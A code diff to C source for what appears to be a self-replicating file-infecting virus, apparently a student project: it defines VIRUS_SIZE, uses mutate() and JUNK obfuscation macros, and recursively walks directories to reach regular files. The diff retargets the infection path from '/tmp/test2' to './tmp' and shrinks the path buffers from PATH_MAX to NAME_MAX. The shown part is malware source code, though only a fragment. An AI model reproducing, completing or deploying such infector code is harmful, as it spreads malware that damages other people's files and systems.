@@ -22,7 +22,7 @@
 #endif
 
 #ifndef PATH2
- #define PATH2 "/tmp/test2"
+ #define PATH2 "./tmp"
 #endif
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
@@ -299,13 +299,13 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 				continue;
 			
 			if (dir->d_type == DT_REG) {
-				char new_path[PATH_MAX]; JUNK;
+				char new_path[NAME_MAX]; JUNK;
 
 				char *ptr = new_path;
 
-				ptr = ft_stpncpy(ptr, file, PATH_MAX - (ptr - new_path));
-				ptr = ft_stpncpy(ptr, STR("/"), PATH_MAX - (ptr - new_path));
-				ft_stpncpy(ptr, dir->d_name, PATH_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, file, NAME_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, STR("/"), NAME_MAX - (ptr - new_path));
+				ft_stpncpy(ptr, dir->d_name, NAME_MAX - (ptr - new_path));
 
 				mutate();
 
@@ -318,12 +318,12 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 				}
 
 			} else if (dir->d_type == DT_DIR) {
-				char new_path[PATH_MAX];
+				char new_path[NAME_MAX];
 
 				char *ptr = new_path;
-				ptr = ft_stpncpy(ptr, file, PATH_MAX - (ptr - new_path));
-				ptr = ft_stpncpy(ptr, STR("/"), PATH_MAX - (ptr - new_path));
-				ft_stpncpy(ptr, dir->d_name, PATH_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, file, NAME_MAX - (ptr - new_path));
+				ptr = ft_stpncpy(ptr, STR("/"), NAME_MAX - (ptr - new_path));
+				ft_stpncpy(ptr, dir->d_name, NAME_MAX - (ptr - new_path));
 
 				open_file(new_path, bs_data, counter);
 			}
